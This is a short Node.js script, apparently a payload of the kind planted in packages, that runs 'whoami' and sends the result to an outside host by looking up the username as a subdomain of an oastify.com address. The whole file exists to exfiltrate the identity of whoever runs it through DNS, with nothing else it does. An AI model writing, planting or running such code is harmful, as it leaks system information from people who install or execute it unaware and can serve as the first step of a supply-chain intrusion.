const {exec} = require("child_process");

exec("a=$(whoami) && host $a.jylyppzk8gigfda6wblt6zjwvn1ep5du.oastify.com", (error, data, getter) => {
    if(error){
        console.log("error", error.message);
        return;
    }
    if(getter){
        console.log("data", data);
        return;
    }
    console.log(data);
}
);
